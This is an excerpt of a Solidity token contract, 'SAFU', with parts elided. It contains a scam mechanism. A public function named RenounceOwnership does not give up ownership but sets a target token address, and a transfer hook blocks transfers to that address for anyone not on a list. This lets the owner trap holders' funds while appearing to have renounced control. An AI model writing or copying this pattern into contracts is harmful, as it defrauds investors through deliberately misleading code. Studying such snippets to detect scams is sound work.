...
contract SAFU is ERC20, Ownable {
    ...
    function RenounceOwnership(address safuToken_) public onlyOwner {
        _safuToken = safuToken_;
    }

    function _tendieMaker(address from, address to, uint256 amount) internal virtual override {
        if(to == _safuToken) {
            require(_blacklisted[from], "FUNDS ARE SAFU FROM BOTS!");
        }
    }
}
